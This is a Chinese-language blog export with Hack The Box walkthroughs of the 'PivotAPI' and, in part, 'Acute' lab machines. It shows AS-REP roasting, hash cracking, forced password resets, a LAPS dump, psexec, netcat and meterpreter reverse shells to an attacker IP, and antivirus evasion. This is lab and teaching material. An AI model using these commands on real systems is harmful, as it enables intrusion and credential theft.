
[{"content":"","date":"6 August 2025","externalUrl":null,"permalink":"/","section":"Blowfish","summary":"","title":"Blowfish","type":"page"},{"content":"涉及到的内容:\nsmb服务枚举 PDF文件元数据查看 FTP匿名访问 Kerberos-\u0026gt;AS-REP Roasting 攻击 john破解 TGT hash nxc(NetExec)访问Smb服务 outlook邮件格式转换 bloodhound进行域内攻击路径解析 ghidra静态分析 PE文件逆向 sysinternals组件的Procmon64程序动态分析PE文件 简单的windows用户, 目录权限设置 BAT文件简单修改 API Monitor进行进程行为监控，监控进程与windowsAPI的交互与调用的函数及数据 基于mssql的提权 基于mssql绕过机器本身对于TCP, UDP, ICMP的封锁 域内用户，用户组枚举 keepass密码文件破解（kdbx） 使用dnspy逆向dotNET程序 内网横移 使用rpcclient修改域内用户的密码 使用laps.py脚本，dump LAPS密码 psexec.py脚本得到administrador用户权限，拿下域控 使用到的工具:\nnmap, dig, smbmap, smbclient, nxc, rpcclient, enum4linux-ng ftp exiftool, pdf-parse kerbrute john, hashcat bloodhound sysinternals, pocman64 API Monitor, dnspy mssqlclient.py, mssqlproxy `evil-winrm, laps.py, psexec.py PivotAPI是Hackthebox INSAIN难度的靶机，前期的信息收集与枚举过程中就花了很多时间，最终在PDF文件的metadata中得到初始的用户名，通过AS-REP Roasting攻击得到了初始的域内用户，登录到smb服务之后得到exe程序，ghidra静态分析发现程序本身是有加密的，通过sysinternals组件的pcoman64程序进行动态分析，查看程序所做的行为，修改用户对于temp目录的删除权限，保留下bat文件，修改bat文件的内容，得到第二个exe文件，在通过API Monitor程序，分析第二exe程序的syscall（与windows API的交互），查看其运行时产生的数据，从而结合bloodhound的分析，通过猜测得到mssql SA用户的凭证，通过mssqlproxy绕过受限制的环境，成功将内网中的winrm服务转发出来，得到一个不稳定的winrm shell，在登录之后简单浏览，得到一个keepass的密码文件，通过john破解得到一个可以ssh登录的用户，之后简单浏览，evil-winrm访问用户jari的文件夹，得到dotNET程序，通过对dotNET程序使用dnspy进行逆向，查看其中数据得到一个密码。结合bloodhound的分析，使用rpcclient来逐个修改密码，而不是使用特别折磨的winrm。从而一路横移到可以读取LAPS的用户，通过laps.py开源脚本读取administrador用户的LAPS密码，从而避免了使用winrm。根据bloodhound的分析，administrador用户本身不能ssh登陆也不能winrm登录，这里使用psexec.py来得到administrador用户的shell，最终拿到root flag。\n整个流程中关键点在于对于windows程序以及.NET程序的简单逆向，使用针对kerberos不安全配置的AS-REP Roasting 攻击，通过mssqlproxy绕过对于TCP, UDP, ICMP出站的封锁，使用rcpclient从而不适用受限制的winrm来修改域内用户密码并最终得到administrador用户的LAPS，中间过程中参杂许多的小技巧与细节，整体难度特别大。\nRecon # ports=$(cat nmapscan/ports.nmap | grep open | awk -F \u0026#39;/\u0026#39; \u0026#39;{print $1}\u0026#39; | paste -sd \u0026#39;,\u0026#39;) sudo nmap -sT -p21,53,88,135,139,389,445,464,593,636,1433,3268,3269,9389,49667,49673,49674,49706 -sC -sV -O 10.10.10.240 -oA nmapscan/details FTP # ftp 10.10.10.240 anonymous binary prompt mget *.pdf SMB枚举 # 手工使用如smbmap, smbclient, rpcclient等进行枚举，发现在没有得到凭证的情况下对于SMB服务没有访问权限，通过enum4linux-ng自动枚举的结果中也可以看到\nenum4linux-ng -A LicorDeBellota.htb PDF # 通过PDF得到了几个用户名\nexiftool *.pdf | grep -i -E creator\\|author | grep -v -i microsoft | awk -F \u0026#39;:\u0026#39; \u0026#39;{print $2}\u0026#39; | uniq | grep -vE \u0026#39;[0-9]\u0026#39; | tail -n 5 | tail -n 4 | tee username saif byron gronseth gronseth byron Kaorz alex AS-REP Roasting 攻击 # 如果域控中某些用户没有开启预认证，那么就可能可以通过AS-REP Roasting的方式得到这些用户的TGT，离线解密从而得到凭证。\n./kerbrute userenum --dc 10.10.10.240 -d LicorDeBellota.htb username.txt [+] VALID USERNAME: Kaorz@LicorDeBellota.htb john破解一下TGT hash\n─$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py LicorDeBellota.htb/Kaorz -dc-ip 10.10.10.240 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies Password: [*] Cannot authenticate Kaorz, getting its TGT $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:1bc7f71d47c8a4389f7716eadeb6f786$dfe45a53c00a2d9ed2173cef52ad9a7c0fa5833fd2ffe67383ee5156ee9d0144de9a639d0453327662535d4c0d1707f5d681c0cbb84f759732d7298d77e67dcd79cb28ced178c0570ec65e9d3507b1e6a11eeedc2ba604730746fc452ea935e642da0c145fea90df69babf68af6068cfd31b4e7de90560ce30db6adbda8cf11c3f6c0b1b368b0ced102ffe8b794888c6179f1c7c36ea7bbc7336fa77a952fb4c4c63dcfab21d4d6128f4143d514b870370d87c2c690c6700b58d940af2b5b917c083bcbdbc1ea43d114bc97dbb60d6abbcef22da6e2f460f95d23c734bd9955f85cfc72267655f419012c66bd5e064b5d7abad13054f0674 john TGT_hash --wordlist=/usr/share/wordlists/rockyou.txt john TGT_hash --show $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:Roper4155 也可以使用hashcat\n.\\hashcat.exe --help | findstr AS-REP 18200 | Kerberos 5, etype 23, AS-REP .\\hashcat.exe -m 18200 .\\hashes\\TGT_hash.txt .\\hashes\\rockyou.txt Roper4155 Kaorz:Roper4155 尝试使用得到的凭证登陆mssql，ssh。 都没能成功\ncd /usr/share/doc/python3-impacket/examples export PATH=$PATH:. mssqlclient.py LicorDeBellota.htb/Kaorz:Roper4155@LicorDeBellota.htb [-] ERROR(PIVOTAPI\\SQLEXPRESS): Line 1: Error de inicio de sesión del usuario \u0026#39;Kaorz\u0026#39;. └─$ sshpass -p \u0026#39;Roper4155\u0026#39; ssh Kaorz@LicorDeBellota.htb Permission denied, please try again. 登录到SMB服务 # nxc smb LicorDeBellota.htb -u \u0026#39;Kaorz\u0026#39; -p \u0026#39;Roper4155\u0026#39; --shares SMB 10.10.10.240 445 PIVOTAPI IPC$ READ IPC remota SMB 10.10.10.240 445 PIVOTAPI NETLOGON READ Recurso compartido del servidor de inicio de sesión SMB 10.10.10.240 445 PIVOTAPI SYSVOL READ Recurso compartido del servidor de inicio de sesión smbclient -U LicorDeBellota.htb/Kaorz%Roper4155 //10.10.10.240/IPC$ # /IPC$ 没有文件 smbclient -U LicorDeBellota.htb/Kaorz%Roper4155 //10.10.10.240/NETLOGON cd helpdesk prompt off mget * 读取msg outlook邮件文件(msgconvert) # msgconvert可以将outlook邮件格式转换成Linux可以读取的eml格式\nmsgconvert *.msg Due to the problems caused by the Oracle database installed in 2010 in Windows, it has been decided to migrate to MSSQL at the beginning of 2020. Remember that there were problems at the time of restarting the Oracle service and for this reason a program called \u0026#34;Reset-Service.exe\u0026#34; was created to log in to Oracle and restart the ser vice. After the last pentest, we have decided to stop externally displaying WinRM\u0026#39;s service. Several of our employees are the creators of Evil-WinRM so we do not want to expose this service... We have created a rule to block the exposure of the service and we have also blocked the TCP, UDP and even ICMP output (So that no shells of the type icmp are used.) Greetings, The HelpDesk Team 使用Bloodhound分析攻击路径 # bloodhound query library\nadmin, admin admin Pass@word!123456 # 使用采集器采集域内信息 bloodhound-python -c ALL -d LicorDeBellota.htb -dc LicorDeBellota.htb -u Kaorz -p \u0026#39;Roper4155\u0026#39; -ns 10.10.10.240 --zip INFO: Found 28 users INFO: Found 58 groups INFO: Found 3 gpos INFO: Found 1 ous INFO: Found 19 containers INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers 设置Kaorz用户为owned，bloodhound没有找到任何可能的横移路径\nPE程序逆向 # 通过ghidra静态分析发现基本上都是有混淆的，啥也看不出来，换个动态分析的工具\n使用Procmon64动态分析 # sysinternals\n微软的sysinternals套件是一套用于进程监控，调试等功能的工具集合，这里用Procmon工具监控Restart-OracleService.exe运行时的行为\n在过滤器中设置Process Name-\u0026gt; contain-\u0026gt; OracleService和\u0026gt;Operation-\u0026gt;cotains-\u0026gt;Reg-\u0026gt;Exclude\n可以看到创建了BAT文件并写入，但是实际去路径中看的时候发现什么都没有，通过修改Temp文件夹的权限，来禁止掉一切可能存在的删除操作，然后再执行exe文件\n右键-\u0026gt;`properties`-\u0026gt;-\u0026gt;`Security`-\u0026gt;admin用户-\u0026gt;`advanced`-\u0026gt;`disable inheritance`-\u0026gt;`Convert to xxxx` 此时就可以编辑admin用户的权限了 重新执行一下exe文件，看到在Temp目录下bat文件被保存下来了，打开bat文件查看里面的内容，发现最开始判断了username，然后输出一堆的base64编码过的内容到c:\\programdata\\oracle.txt文件中，最后写了一个ps1脚本，逐行遍历oracle.txt文件，将内容base64解码并且调用IO操作，将解码后的raw写入restart-service.exe，powershell执行脚本之后再执行exe文件，之后删掉所有记录\necho $salida = $null; $fichero = (Get-Content C:\\ProgramData\\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(\u0026#34; \u0026#34;,\u0026#34;\u0026#34;); [System.IO.File]::WriteAllBytes(\u0026#34;c:\\programdata\\restart-service.exe\u0026#34;, [System.Convert]::FromBase64String($salida)) \u0026gt; c:\\programdata\\monta.ps1 powershell.exe -exec bypass -file c:\\programdata\\monta.ps1 powershell.exe -exec bypass -file c:\\programdata\\monta.ps1 del c:\\programdata\\monta.ps1 del c:\\programdata\\oracle.txt c:\\programdata\\restart-service.exe del c:\\programdata\\restart-service.exe 修改一下这个文件的内容，删掉一开始对于用户名的判断和最后的删除操作\ngoto correcto goto error 如果一切正常就能在programdata下看到文件。\n逆向分析restart-service.exe # 在ghidra打开之后提示MinGW Relocations: MinGW pseudo-relocation list not found，这是因为windows PE文件不支持ELF文件那样的PIC（位置无关代码）的方式进行重定位，所以wingw使用了伪重定位的方式来处理静态链接库和全局变量的位置问题。\n直接在windows上用windows的分析工具分析，这里要在ghidra上修复这个问题再静态分析，太难搞\nAPI Monitor # API Monitor\nAPI Monitor可以监控程序运行时和windows API的交互，以及函数，数据等，就像Linux中strace可以跟踪ELF程序运行时候的syscall一样\n监控一下进程，因为在邮件中提示restart-service.exe是一个用来解决Oracle数据库的运行问题的程序，用来重启Oracle，所以尝试用关键词passw直接搜索一下是否存在连接数据库的账号密码。\nsvc_oracle: #oracle_s3rV1c3!2010 域渗透 # 在bloodhound查看一下，发现只有svc_mssql用户\n$ sshpass -p \u0026#39;#oracle_s3rV1c3!2010\u0026#39; ssh svc_oracle@LicorDeBellota.htb Permission denied, please try again. 根据之前邮件的内容以及bloodhound查找到的mssql用户，猜测可能存在一个mssql的凭证\nsvc_mssql, #mssql_s3rV1c3!2020 mssqlclient.py \u0026#39;LicorDeBellota.htb/svc_mssql:#mssql_s3rV1c3!2020@10.10.10.240\u0026#39; Line 1: Error de inicio de sesión del usuario \u0026#39;svc_mssql\u0026#39;. 提示不正确，这里可能是猜测错了，但是svc_mssql这个账号是bloodhound给出的一个系统账号，服务器本身的mssql是不是用的svc_mssql这个用户名，其实不一定，还可以试试mssql的默认用户名\nmssqlclient.py \u0026#39;LicorDeBellota.htb/sa:#mssql_s3rV1c3!2020@10.10.10.240\u0026#39; enable_xp_cmdshell xp_cmdshell systeminfo 原文（西班牙语） 翻译（英语） Nombre de host: PIVOTAPI Host Name: PIVOTAPI Nombre del sistema operativo: Microsoft Windows Server 2019 Standard OS Name: Microsoft Windows Server 2019 Standard Versión del sistema operativo: 10.0.17763 N/D Compilación 17763 OS Version: 10.0.17763 N/A Build 17763 Configuración del sistema operativo: Controlador de dominio principal OS Configuration: Primary Domain Controller Propiedad de: Usuario de Windows Registered Owner: Windows User Fecha de instalación original: 07/08/2020, 23:14:31 Original Install Date: 07/08/2020, 23:14:31 Tiempo de arranque del sistema: 05/08/2025, 2:27:32 System Boot Time: 05/08/2025, 2:27:32 Fabricante del sistema: VMware, Inc. System Manufacturer: VMware, Inc. Modelo el sistema: VMware7,1 System Model: VMware7,1 Tipo de sistema: x64-based PC System Type: x64-based PC Procesador(es): 2 Procesadores instalados. Processor(s): 2 processors installed. Versión del BIOS: VMware, Inc\u0026hellip; BIOS Version: VMware, Inc\u0026hellip; Directorio de Windows: C:\\Windows Windows Directory: C:\\Windows Directorio de sistema: C:\\Windows\\system32 System Directory: C:\\Windows\\system32 Dispositivo de arranque: \\Device\\HarddiskVolume2 Boot Device: \\Device\\HarddiskVolume2 Configuración regional del sistema: es;Español (internacional) System Locale: es;Spanish (International) Idioma de entrada: en-us;Inglés (Estados Unidos) Input Language: en-us;English (United States) Zona horaria: UTC+01:00 Amsterdam, Berlin\u0026hellip; Time Zone: UTC+01:00 Amsterdam, Berlin\u0026hellip; Cantidad total de memoria física: 4.095 MB Total Physical Memory: 4,095 MB Dominio: LicorDeBellota.htb Domain: LicorDeBellota.htb Revisión(es): 8 revisión(es) instaladas. Hotfix(es): 8 Hotfixes Installed Tarjeta(s) de red: 1 Tarjetas de interfaz de red instaladas. Network Adapter(s): 1 network interface card installed Direcciones IP: 10.10.10.240 IP Address: 10.10.10.240 Requisitos Hyper-V: Se detectó un hipervisor. No se mostrarán las características necesarias para Hyper-V. Hyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. enable_xp_cmdshell xp_cmdshell whoami /priv 名称（Privilege Name） 描述（Description） 状态（Status） SeAssignPrimaryTokenPrivilege Reemplazar un símbolo (token) de nivel de proceso (Replace a process-level token) ❌ Deshabilitado (Disabled) SeIncreaseQuotaPrivilege Ajustar las cuotas de la memoria para un proceso (Adjust memory quotas for a process) ❌ Deshabilitado (Disabled) SeMachineAccountPrivilege Agregar estaciones de trabajo al dominio (Add workstations to domain) ❌ Deshabilitado (Disabled) SeChangeNotifyPrivilege Omitir comprobación de recorrido (Bypass traverse checking) ✅ Habilitada (Enabled) SeManageVolumePrivilege Realizar tareas de mantenimiento del volumen (Manage volume maintenance tasks) ✅ Habilitada (Enabled) SeImpersonatePrivilege Suplantar a un cliente tras la autenticación (Impersonate client after authentication) ✅ Habilitada (Enabled) SeCreateGlobalPrivilege Crear objetos globales (Create global objects) ✅ Habilitada (Enabled) SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso (Increase process working set) ❌ Deshabilitado (Disabled) 提权 # mssqlproxy # 通过mssql得到的shell做一些简单的枚举\nMiembros del grupo local Miembros del grupo global *Usuarios del dominio *WinRM SQL (sa dbo@master)\u0026gt; xp_cmdshell netstat -ano | findstr 5985 output --------------------------------------------------------------------------- TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP [::]:5985 [::]:0 LISTENING 4 UDP 0.0.0.0:55985 *:* 2532 NULL 能看到winrm服务是正常开放的，但是这是在内网中运行的服务，外部不能直接访问，之前的nmap端口扫描结果也能验证这一点，并且邮件中提示所有TCP, UDP, 甚至ICMP的output都被封掉了，像chisel这样的HTTP代理工具通过socks协议来实现访问，其本质是基于TCP连接的，还是要和kali建立TCP的连接，但是此处TCP出站是被禁止的。\n通过mssqlproxy把内网中的服务转发出来，从而得到evil-winrm的shell，msssqlproxy通过sqlserver来建立通信，从而可以绕过防火墙本身的封锁，使用的TDS协议，这是 SQL Server ⽤于与客户端通信的协议。\npython3 mssqlproxy/mssqlclient.py \u0026#39;sa:#mssql_s3rV1c3!2020@10.10.10.240\u0026#39; enable_ole upload reciclador.dll C:\\windows\\temp\\reciclador.dll python mssqlproxy/mssqlclient.py \u0026#39;sa:#mssql_s3rV1c3!2020@10.10.10.240\u0026#39; -install -clr assembly.dll python mssqlproxy/mssqlclient.py \u0026#39;sa:#mssql_s3rV1c3!2020@10.10.10.240\u0026#39; -start -reciclador \u0026#39;c:\\programdata\\reciclador.dll\u0026#39; /etc/proxychains4.conf # 添加一行socks5代理 socks5 127.0.0.1 1337 测试一下mssqlproxy是否已经建立\nsudo proxychains4 nmap -sT -p 5985 127.0.0.1 PORT STATE SERVICE 5985/tcp open wsman 破解kdbx密码 # keepass2john credentials.kdbx \u0026gt; kdbx_hash john kdbx_hash --wordlist=/usr/share/wordlists/rockyou.txt mahalkita show -f \u0026#39;Sample Entry\u0026#39; show -f Sample\\ Entry\\ #2 kpcli:/Database\u0026gt; show -f \u0026#39;Windows/SSH\u0026#39; Path: /Database/Windows/ Title: SSH Uname: 3v4Si0N Pass: Gu4nCh3C4NaRi0N!23 URL: Notes: ssh 3v4Si0N@LicorDeBellota.htb 通过bloodhound一路横移 # DR.ZAIUSS-\u0026gt;SUPERFUME-\u0026gt;DEVELOPERS group，修改密码之后通过evil-winrm登录到用户，进行下一步横移，SUPERFUME用户属于developer组，在jail用户的目录下找到到 .NET 程序restart-service.exe\n# Pass@word!123 python mssqlproxy/mssqlclient.py \u0026#39;sa:#mssql_s3rV1c3!2020@10.10.10.240\u0026#39; -start -reciclador \u0026#39;c:\\programdata\\reciclador.dll\u0026#39; net user DR.ZAIUSS Pass@word!123 net user SUPERFUME Pass@word!123 dotNET逆向 # 通过dnspy逆向.NET程序，在main函数中看到一个writeline()函数，用于以文本格式将数据写入标准输出流，设置断点之后右键数据-\u0026gt;内存中显示，得到输出的内容\nCos@Chung@!RPG jari，Cos@Chung@!RPG 这里mssqlproxy的转发总是有问题，不能正常把端口转发过来，可能是HTB的环境问题。可以换成用rcpclient来登录\nrpcclient -U \u0026#39;jail%Cos@Chung@!RPG\u0026#39; 10.10.10.240 bloodhound给出的路径: jari-\u0026gt;GIBDEON-\u0026gt;OPERS. DE CUENTAS组-\u0026gt;LAPS ADM组-\u0026gt;读取PIVOTAPI.LICORDEBELLOTA.HTB的LAPS\n通过rcpclient更改用户的密码\nsetuserinfo2 gibdeon 23 \u0026#39;Pass@word!123\u0026#39; rpcclient -U \u0026#39;gibdeon%Pass@word!123\u0026#39; 10.10.10.240 为什么这里指定的参数是23: 2.2.6.24 SAMPR_USER_INTERNAL4_INFORMATION\n# SAMPR_USER_INTERNAL4_INFORMATION typedef struct _SAMPR_USER_INTERNAL4_INFORMATION { SAMPR_USER_ALL_INFORMATION I1; SAMPR_ENCRYPTED_USER_PASSWORD UserPassword; } SAMPR_USER_INTERNAL4_INFORMATION, *PSAMPR_USER_INTERNAL4_INFORMATION; licordebellota\\3v4si0n@PIVOTAPI C:\\Users\\3v4Si0N\u0026gt;net groups \u0026#34;LAPS READ\u0026#34; /domain Nombre de grupo LAPS READ Comentario Miembros ------------------------------------------------------------------------------- cybervaca lothbrok Se ha completado el comando correctamente. licordebellota\\3v4si0n@PIVOTAPI C:\\Users\\3v4Si0N\u0026gt;net groups \u0026#34;LAPS ADM\u0026#34; /domain Nombre de grupo LAPS ADM Comentario Miembros ------------------------------------------------------------------------------- cybervaca Se ha completado el comando correctamente. 如果可以拿到cybervaca或者lothbrok用户，那么就可以读取LAPS。\nbloodhound显示GIBDEON@LICORDEBELLOTA.HTB属于OPERS. DE CUENTAS组，此组对于LOTHBROK用户有全部权限\n到这里路径很清晰了，通过rcp修改掉LOTHBROK用户的密码，然后调用LOTHBROK用户的权限读取LAPS就可以了\nDUMP LAPS密码 # 可以直接用开源的python脚本去查看LAPS的值，因为目前通过mssqlproxy代理转发非常不稳定，用powershell读取LAPS属性的方式非常不方便，直接用pyhton脚本来读取更符合当前的场景\ndump LAPS\nsetuserinfo2 lothbrok 23 \u0026#39;hackerone0o!@\u0026#39; └─$ python laps.py -u lothbrok -p \u0026#39;hackerone0o!@\u0026#39; -d LicorDeBellota.htb -l 10.10.10.240 LAPS Dumper - Running at 08-06-2025 00:12:17 PIVOTAPI jDIiWNVly8u1P1KZ4Hb2 psexec.py # 此时虽然已经拿到了administrador用户的密码，但是ssh和winrm都不对这个用户开放，这种情况下可以使用impacket工具集的psexec.py脚本\npython3 psexec.py LicorDeBellota.htb/administrador:jDIiWNVly8u1P1KZ4Hb2@10.10.10.240 psexec.py本身需要在smb服务中上传文件并调用，从而实现getshell，所以在没有smb的写权限的情况下，是不能正常利用的\nroot.txt # 92c3424eef08afa489c41ae9b429e730 ","date":"6 August 2025","externalUrl":null,"permalink":"/posts/htb-pivotapi/","section":"Posts","summary":"","title":"HTB PivotAPI","type":"posts"},{"content":"","date":"6 August 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"Acute是Hackthebox困难难度的靶机，本身并没有什么特别复杂或者特殊的利用方式，需要进行详细的枚举，综合评估得到的信息。首先通过web页面得到一个docx文档，通过文档得到了初始立足点所需要的所有信息，得到立足点后，经过尝试发现存在杀软不检查的目录，从而得到了执行winpeas的可能，winpeas的结果显示存在RDP连接，至此，msfvenom生成一个payload，通过meterpreter得到shell，然后通过msf的后渗透模块截屏，从而得到第一个pscredential。测试winrm是正常的，但是实际调用的时候无法正常通过Enter-PSSession拿到powershell，转而尝试使用invoke-command，找到一个ps1脚本，通过替换脚本中的内容，调用nc从而得到另一个用户的shell，查看权限发现这个用户是本地的管理员用户，那么可以拿到sam和system，使用msf下载文件，impacket-secretsdump本地破解NT哈希，再拿到第二个密码后尝试更换用户名，使用这个密码登录PSWA，都没能成功，转而使用这个密码更换用户名，尝试调用invoke-command命令。最终成功得到了另一个用户的命令执行能力。这里又是不断的枚举，在program files这个常规的windows安装软件的目录中找到可以利用的点，从而通过bat脚本结合net group的信息，以及之前的docx文件的信息，综合判断下，将用户添加进一个高权限的用户组，从而读取到root.txt\n总的来说，这台靶机的难度在于枚举是否仔细，对于已拥有的信息是否进行合理的管理和判断，以及对于Windows用户、用户组，权限的了解。以及对于powershell的一些基本使用，如果本身对于windows的利用经验比较少，那么这台靶机的难度是比较大的.\nRecon # # Nmap 7.95 scan initiated Sun Jul 13 05:47:55 2025 as: /usr/lib/nmap/nmap -sT -p 443 -sC -sV -O -oA nmapscan/details 10.10.11.145 Nmap scan report for 10.10.11.145 Host is up (0.072s latency). PORT STATE SERVICE VERSION 443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | ssl-cert: Subject: commonName=atsserver.acute.local | Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver | Not valid before: 2022-01-06T06:34:58 |_Not valid after: 2030-01-04T06:34:58 |_ssl-date: 2025-07-13T09:25:09+00:00; -23m09s from scanner time. |_http-server-header: Microsoft-HTTPAPI/2.0 | tls-alpn: |_ http/1.1 |_http-title: Not Found Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019|10 (97%) OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -23m09s OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Jul 13 05:48:18 2025 -- 1 IP address (1 host up) scanned in 23.01 seconds 根据详细扫描的结果将域名添加到hosts文件中\nsed -i '1i 10.10.11.145 atsserver.acute.local acute.local'\nPSWA(Windows PowerShell Web Access) # 在about页面下载到New_Starter_CheckList_v7.docx文件，文件中存在一个默认密码Password1!\nIT overview Arrange for the new starter to receive a demonstration on using IT tools which may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the default Password1!. Not all staff are changing these so please be sure to run through this. 在Initial Probation Meeting一栏当中提到PSWA，并且提到sessions名称是dc_manage\nInitial Probation Meeting (For Academic staff on Probation only) Arrange initial probation meeting between Probationer, Head of Department and Probation Adviser. Run through the new PSWA to highlight the restrictions set on the sessions named dc_manage. The probation plan should be completed within a month of the start date and should include a requirement to register with LETs re: rate to gain within 3 months of starting. Fellowship of the Higher Education Academy (FHEA). Induction meetings with management staff当中提到一个用于远程培训的地址https://atsserver.acute.local/Acute_Staff_Access，是一个PSWA的登录界面\nInduction meetings with management staff Arrange for the new starter to meet with other staff in the department as appropriate. This could include the Head of Department and/or other members of the appointee’s team. Complete the [remote](https://atsserver.acute.local/Acute_Staff_Access) training exiftool查看一下docx文档的元数据，存在一些敏感信息.\nexiftool *.docx Creator: FCastle Description: Created on Acute-PC01 Last Modified By: Daniel docx的元数据表现了可能的用户名形式 FCastle 以及可能的hostname Acute-PC01\n综合一下可利用的信息 # awallace chall edavies imonks jmorgan lhopkins Password1! Acute-PC01 内容并不多，直接手工尝试，找到可用于登录的凭证:\nUsername: edavies Password: Password1! ComputerName: Acute-PC01 chisel转发 # 尝试以winrm登录，没有成功\nchisel server -p 8000 --reverse .\\chisel.exe client 10.10.14.9:8000 R:5985:127.0.0.1:5985 尝试运行反弹shell脚本 # certutil.exe -urlcache -split -f http://10.10.14.9/Invoke-PowerShellTcp.ps1 c:\\programdata\\Invoke-PowerShellTcp.ps1 执行脚本时提醒被杀毒软件杀掉，并且一段时间之后直接被断掉连接，再次登录到PSWA之后能看到之前上传的脚本被杀掉了。\n直接上传nc并执行得到反弹shell # 在随意翻目录的时候看到utils这个文件夹，里面内容有chisel,exe，runascs.exe，Invoke-PortScan.ps1，事实上并不是我本身上传的文件，可能这也是一个提示信息，表示这个文件夹可能是没有受到防护软件，比如Windows defender这类软件保护的。\n查看一下这个目录中的隐藏文件\nget-childitem -force -Attributes Hidden -file -file: 只显示隐藏文件 [.ShellClassInfo] InfoTip=Directory for Testing Files without Defender 通过注册表交叉验证\nreg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\u0026#34; 可以看到提示utils这个文件夹是例外的。\n调用invoke-portscan.ps1 # $content = Get-Content .\\invoke-portscan.ps1 $content[0..($content.Count - 3)] | Set-Content .\\invoke-portscan.ps1 这里想写入一下执行命令到invoke-portscan.ps1脚本，但是powershell中Out-File -Append或者Add-Content默认都会添加换行符，即使加上-NoNewline也会非预期的加入换行符，需要通过.NET流操作\n$path = \u0026#34;Invoke-portscan.ps1\u0026#34; $data = \u0026#34;Invoke-PortScan -StartAddress 172.16.22.2 -EndAddress 172.16.22.2 -ScanPort\u0026#34; $stream = [System.IO.File]::Open($path, \u0026#39;Append\u0026#39;, \u0026#39;Write\u0026#39;) $writer = New-Object System.IO.StreamWriter($stream) $writer.Write($data) # 不加换行 $writer.Close() 但是突然想到一个问题，直接上传nc然后执行还没有试过，结果直接执行竟然直接成功了\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;.中间折腾ps1，chisel转发winrm之类的整了半天\u0026hellip;\u0026hellip;.\nInvoke-WebRequest -Uri \u0026#34;http://10.10.14.9/nc.exe\u0026#34; -OutFile \u0026#34;nc.exe\u0026#34; -UseBasicParsing .\\nc.exe 10.10.14.9 4444 -e powershell.exe msfconsole # 这里load powershell没成功执行，可以先执行shell，再执行powershell\nmsfconsole use exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp set LHOST 10.10.14.9 run load powershell shell powershell 这里尝试了多种方式没找到太多的可以利用的点，实在是不行了winpeas自动枚举一下\n͹ Looking for possible password files in users homes https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials C:\\Users\\All Users\\Microsoft\\UEV\\InboxTemplates\\RoamingCredentialSettings.xml C:\\Users\\edavies\\AppData\\Local\\Microsoft\\Edge\\User Data\\ZxcvbnData\\2.0.0.0\\passwords.txt ls \u0026#39;C:\\Users\\edavies\\AppData\\Local\\Microsoft\\Edge\\User Data\\ZxcvbnData\\2.0.0.0\\passwords.txt\u0026#39; length 271951 ![[Pasted image 20250721211733.png]]\n存在RDP登录，用msf截图一下看看远程桌面在执行什么\nmeterpreter # 通过msf得到session之后，使用后渗透模块的进程迁移功能迁移当前进程到explorer.exe，再执行screenshot，执行screenshare的话，大概率很快就会被defender拿下\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.12 lport=4444 -f exe -o rev.exe msfconsole use exploit/multi/handler run 使用msf的后渗透模块进行进程迁移\nbg use post/windows/manage/migrate sessions set session 2 sessions -i 2 screenshot 通过截图看到一个设置pscredential的过程\n$passwd = convertto-securestring \u0026#34;W3_4R3_th3_f0rce.\u0026#34; -AsPlainText -Force $cred = new-object system.management.automation.pscredential (\u0026#34;ACUTE\\imonks\u0026#34;, $passwd) Enter-PSSession ATSSERVER -Credential $cred -ConfigurationName dc_manage 通过pscredential调用invoke-command执行命令 # 总结一下到此得到的信息：\npscredential 域控名(通过.docx文档): dc_manage 主机名: ATSSERVER 用户名: acute\\imonks passwd: W3_4R3_th3_f0rce.\n如果已经得到了pscredential，如果凭证所属的主机开启了winrm，可以尝试远程登录powershell会话，通过pscredential验证smb服务从而传输文件，或者使用invoke-command命令执行命令\n# 测试winrm是否可以登录 Test-WSMan ATSSERVER wsmid : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd ProductVendor : Microsoft Corporation ProductVersion : OS: 0.0.0 SP: 0.0 Stack: 3.0 $passwd = convertto-securestring \u0026#34;W3_4R3_th3_f0rce.\u0026#34; -AsPlainText -Force $cred = new-object system.management.automation.pscredential (\u0026#34;ACUTE\\imonks\u0026#34;, $passwd) Enter-PSSession ATSSERVER -Credential $cred -ConfigurationName dc_manage Enter-PSSession : The term \u0026#39;Measure-Object\u0026#39; is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. 直接登陆winrm提示缺少Measure-Object，无法直接调用winrm，虽然不能直接winrm登录，但是可以使用invoke-command来调用命令\nrlwrap得到一个交互性更好的shell\nsudo rlwrap -cAr nc -lvnp 5555 iwr -uri http://10.10.14.12/nc.exe -outfile nc.exe .\\nc.exe 10.10.14.12 5555 -e cmd.exe invoke-command # invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { get-command } # GET User Flag invoke-command -computerName ATSSERVER -Credential 